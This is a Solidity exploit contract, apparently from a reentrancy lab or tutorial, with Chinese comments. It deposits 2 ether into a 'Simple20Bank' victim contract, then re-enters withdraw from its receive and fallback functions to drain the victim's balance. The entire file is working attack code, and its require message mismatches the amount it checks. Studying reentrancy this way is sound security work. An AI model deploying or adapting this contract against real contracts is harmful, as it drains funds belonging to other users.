pragma solidity ^0.8.0;

import "./Simple20Bank.sol";

import "hardhat/console.sol";

contract Attack20 {
    Simple20Bank public victim;

    // 设定受害者合约地址
    constructor(address _victimAddress) public {
        victim = Simple20Bank(_victimAddress);
    }

    // 重写receive
    receive() external payable {
        if(address(victim).balance >= 1 ether){
            console.log("receive reentrancy");
            victim.withdraw(1 ether);
        }
    }

    // 在没有receive的情况下会调用fallback
    fallback() external payable {
        if(address(victim).balance >= 1 ether){
            console.log("fallback reentrancy");
            victim.withdraw(1 ether);
        }
    }

    //攻击，调用受害者的withdraw函数
    function exp() external payable {
        require(msg.value >= 2 ether,"should >= 1 ether");
        victim.deposit{value: 2 ether}();
        victim.withdraw(2 ether);
    }

    //查询余额
    function getBalance() public view returns(uint) {
        return address(this).balance;
    }
}
